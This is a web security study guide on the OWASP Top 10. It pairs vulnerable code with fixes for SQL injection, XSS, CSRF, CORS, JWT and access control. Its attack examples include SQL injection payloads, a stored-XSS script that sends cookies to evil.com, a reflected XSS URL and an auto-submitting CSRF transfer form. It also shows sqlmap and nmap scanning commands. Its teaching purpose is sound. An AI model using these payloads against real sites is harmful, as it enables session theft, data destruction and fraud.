# Web Security Fundamentals — OWASP Top 10

> **Tags:** `security` `owasp` `xss` `sql-injection` `csrf` `cors` `csp`
> **Level:** Intermediate | **Prerequisite:** `01-web-security-fundamentals.md`

---

## 1. OWASP Top 10 (2021)

| Rank | Category | Description |
|---|---|---|
| A01 | Broken Access Control | 94% of apps tested |
| A02 | Cryptographic Failures | Sensitive data exposure |
| A03 | Injection | SQL, NoSQL, OS, LDAP |
| A04 | Insecure Design | Missing threat modeling |
| A05 | Security Misconfiguration | Default configs, verbose errors |
| A06 | Vulnerable Components | Outdated libraries |
| A07 | Authentication Failures | Credential stuffing, weak passwords |
| A08 | Data Integrity Failures | Insecure deserialization, CI/CD |
| A09 | Logging Failures | Insufficient logging |
| A10 | SSRF | Forged server-side requests |

---

## 2. SQL Injection

**Tấn công**: inject malicious SQL code vào query thông qua user input.

```python
# VULNERABLE
user_input = "admin' --"   # OR: "1' OR '1'='1"

query = f"SELECT * FROM users WHERE username = '{user_input}'"
# Becomes: SELECT * FROM users WHERE username = 'admin' --'
# '--' comments out the rest → bypasses password check!

# More dangerous:
payload = "'; DROP TABLE users; --"
# SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
```

### Fix: Parameterized Queries / Prepared Statements
```python
# SAFE — Python (psycopg2)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password_hash = %s",
    (username, password_hash)   # Parameters are NEVER part of SQL
)

# SAFE — SQLAlchemy ORM
user = db.session.query(User).filter_by(username=username).first()

# SAFE — Node.js (pg)
const result = await pool.query(
    'SELECT * FROM users WHERE username = $1',
    [username]
);

# SAFE — Go (database/sql)
row := db.QueryRow("SELECT * FROM users WHERE username = $1", username)
```

### Second-Order SQL Injection
```python
# Step 1: Store malicious data (safely)
cursor.execute("INSERT INTO users (name) VALUES (%s)", ("admin'--",))

# Step 2: Use stored data in another query (unsafely!)
name = get_user_name(user_id)   # Returns "admin'--"
cursor.execute(f"UPDATE profiles SET bio='{name}' WHERE ...")  # VULN!
```

### Detection with sqlmap
```bash
sqlmap -u "https://example.com/user?id=1" --level=3
sqlmap -r request.txt --dbs   # Test specific request file
```

---

## 3. XSS — Cross-Site Scripting

Inject malicious JS into pages viewed by other users.

### Stored XSS
```html
<!-- Attacker posts comment: -->
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie    // Steal session cookies!
  });
</script>

<!-- When victim views page, script executes in their browser -->
```

### Reflected XSS
```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### DOM XSS
```javascript
// VULNERABLE
const name = location.hash.substr(1);   // #<script>alert(1)</script>
document.getElementById('greeting').innerHTML = 'Hello ' + name;  // Executes script!

// SAFE
document.getElementById('greeting').textContent = 'Hello ' + name;  // Text only
// Or
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Prevention
```javascript
// 1. Escape output (context-aware)
// HTML context: escape <, >, &, ", '
function escapeHTML(str) {
    return str.replace(/[&<>"']/g, tag => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#x27;'
    }[tag]));
}

// 2. Use textContent instead of innerHTML
element.textContent = userInput;    // Always safe

// 3. Content Security Policy (CSP) header
// If XSS script does run, CSP prevents it loading from attackers' server
```

### Content Security Policy (CSP)
```
# Strict CSP header
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}';  # Inline scripts need nonce
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';        # Prevent clickjacking
  form-action 'self';

# Nginx
add_header Content-Security-Policy "default-src 'self';" always;

# Report violations (without blocking)
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

---

## 4. CSRF — Cross-Site Request Forgery

Attacker tricks authenticated user's browser into making unwanted requests.

```html
<!-- Attacker's evil.com page: -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker-account">
      <input name="amount" value="10000">
    </form>
  </body>
</html>
<!-- If victim is logged into bank.com, their cookies auto-sent! -->
```

### Prevention

**1. CSRF Token (Synchronizer Token Pattern)**:
```python
# Server generates random token per session/request
@app.before_request
def set_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

# Include in every form
<form>
    <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
    ...
</form>

# Server validates token on POST
@app.route('/transfer', methods=['POST'])
def transfer():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403)  # CSRF attack!
```

**2. SameSite Cookie Attribute** (modern browsers):
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
# SameSite=Strict: Cookie never sent on cross-site requests
# SameSite=Lax: Cookie sent on top-level GET navigations only (default Chrome)
# SameSite=None; Secure: Always sent (required for third-party cookies)
```

**3. Double Submit Cookie**:
```javascript
// Frontend: read CSRF cookie, add to request header
const csrfToken = document.cookie.match(/csrf_token=([^;]+)/)?.[1];
fetch('/api/transfer', {
    method: 'POST',
    headers: { 'X-CSRF-Token': csrfToken },
    body: JSON.stringify(data)
});
```

---

## 5. Security Headers

```nginx
# Nginx: Comprehensive security headers
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header Content-Security-Policy "default-src 'self';" always;
```

| Header | Purpose |
|---|---|
| **HSTS** | Force HTTPS for N seconds |
| **X-Content-Type-Options: nosniff** | Prevent MIME sniffing |
| **X-Frame-Options: DENY** | Prevent clickjacking |
| **Content-Security-Policy** | Control allowed resources |
| **Referrer-Policy** | Control Referer header |
| **Permissions-Policy** | Control browser features |

---

## 6. CORS — Cross-Origin Resource Sharing

Browser security: scripts can only fetch from same origin by default.

```
Origin = scheme + host + port
https://app.example.com ≠ https://api.example.com  (different subdomain)
http://example.com       ≠ https://example.com      (different scheme)
https://example.com:80   ≠ https://example.com:443  (different port)
```

### Simple vs Preflight Requests
```
Simple request (no preflight): GET/POST, basic headers
→ Browser sends request with Origin header
→ Server responds with Access-Control-Allow-Origin

Preflight request (OPTIONS first): PUT/DELETE, custom headers, JSON
Browser → OPTIONS /api/data (Preflight, no body)
Server  → 200 OK + Access-Control-* headers
Browser → Actual request (if allowed)
```

### Server configuration
```python
# FastAPI (Python)
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com", "https://admin.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=3600,   # Cache preflight for 1 hour
)

# Express (Node.js)
const cors = require('cors');
app.use(cors({
    origin: (origin, callback) => {
        const allowed = ['https://app.example.com'];
        if (!origin || allowed.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
}));
```

### ⚠️ CORS Mistakes
```
# WRONG: allow all origins with credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # Browser ignores this combo!

# WRONG: Reflect any Origin without validation
Access-Control-Allow-Origin: request.headers['origin']  # Allows ANY site!

# CORRECT: Validate against allowlist
allowed_origins = {'https://app.example.com', 'https://admin.example.com'}
if origin in allowed_origins:
    response.headers['Access-Control-Allow-Origin'] = origin
```

---

## 7. Authentication Security

### Password Storage
```python
# NEVER store plaintext passwords!
# NEVER use MD5 or SHA1 alone (too fast — brute-forceable)

# bcrypt (recommended): built-in salt + work factor
import bcrypt

# Hash password
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# $2b$12$... (includes salt!)

# Verify
is_valid = bcrypt.checkpw(password.encode(), hashed)

# Argon2 (modern alternative, winner of Password Hashing Competition)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
hash = ph.hash(password)
ph.verify(hash, password)  # Raises exception on failure
```

### JWT Security
```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-very-secret-key-at-least-256-bits"

# Creating JWT
def create_token(user_id: int) -> str:
    payload = {
        "sub": str(user_id),
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=1),  # Short expiry!
        "jti": secrets.token_hex(16),  # Unique ID (for blacklisting)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

# Verifying JWT
def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],   # Specify allowed algorithms!
            options={"require": ["exp", "sub", "iat"]}
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expired")
    except jwt.InvalidTokenError:
        raise AuthError("Invalid token")
```

**JWT Security checklist:**
- [ ] Algorithm is specified (prevent `alg: none` attack)
- [ ] Short expiry (15min access token, 7d refresh token)
- [ ] HS256 secret is truly random (≥256 bits)
- [ ] RSA (RS256) for public-key scenarios
- [ ] Don't store sensitive data in JWT payload (base64 decoded easily)

---

## 8. Broken Access Control

Most common OWASP vulnerability. Fix: authorize EVERY request server-side.

```python
# VULNERABLE: rely on frontend to hide admin panel
@app.get("/api/admin/users")
def get_all_users():
    return db.query(User).all()  # No auth check!

# VULNERABLE: IDOR (Insecure Direct Object Reference)
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, user: User = Depends(get_current_user)):
    return db.query(Order).get(order_id)  # Returns ANY order!

# SAFE: Verify ownership
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, user: User = Depends(get_current_user)):
    order = db.query(Order).filter(
        Order.id == order_id,
        Order.user_id == user.id  # Verify it belongs to requester
    ).first()
    if not order:
        raise HTTPException(404)
    return order

# SAFE: Role-based access
def require_role(role: str):
    def dependency(user: User = Depends(get_current_user)):
        if user.role != role:
            raise HTTPException(403, "Insufficient permissions")
        return user
    return dependency

@app.get("/api/admin/users")
def get_all_users(admin: User = Depends(require_role("admin"))):
    return db.query(User).all()
```

---

## 9. Security in Dependencies

```bash
# Python
pip audit                    # Check for known vulnerabilities
safety check                 # pip safety
pip-audit --requirement requirements.txt

# Node.js
npm audit                    # Built-in
npm audit fix                # Auto-fix where possible
snyk test                    # Snyk integration

# Automated: Dependabot (GitHub) or Renovate
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## 10. Security Testing

```bash
# OWASP ZAP — automated web vulnerability scanner
docker run -v $(pwd):/zap/wrk/ owasp/zap2docker-stable zap-baseline.py \
    -t https://example.com \
    -g gen.conf \
    -r report.html

# nikto — web server scanner
nikto -h https://example.com

# nmap — port/service discovery  
nmap -sV -sC -p- target.example.com

# SSL/TLS testing
sslyze target.example.com
testssl.sh target.example.com

# Check security headers
curl -I https://example.com | grep -i 'strict-transport\|x-content\|content-security'
# Or: https://securityheaders.com
```

---

*Tài liệu liên quan: `security/01-web-security-fundamentals.md` | `security/02-authentication.md` | `security/03-encryption.md` | `authorization/01-rbac-abac.md`*
